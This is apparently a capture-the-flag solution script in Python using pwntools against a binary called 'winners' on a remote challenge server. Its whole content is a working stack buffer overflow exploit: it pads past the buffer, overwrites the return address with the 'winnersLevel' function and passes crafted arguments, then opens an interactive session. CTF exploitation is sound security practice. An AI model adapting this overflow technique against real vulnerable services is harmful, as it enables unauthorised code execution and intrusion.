from pwn import *

r=remote("chals20.cybercastors.com",14434)
#r=process("./winners")
b=ELF("./winners")

pay=""
pay+='x'*0x48
pay+='x'*4
pay+=p32(b.symbols['winnersLevel'])
pay+=p32(0)
pay+=p32(0x102)

r.sendline(pay)
r.interactive()
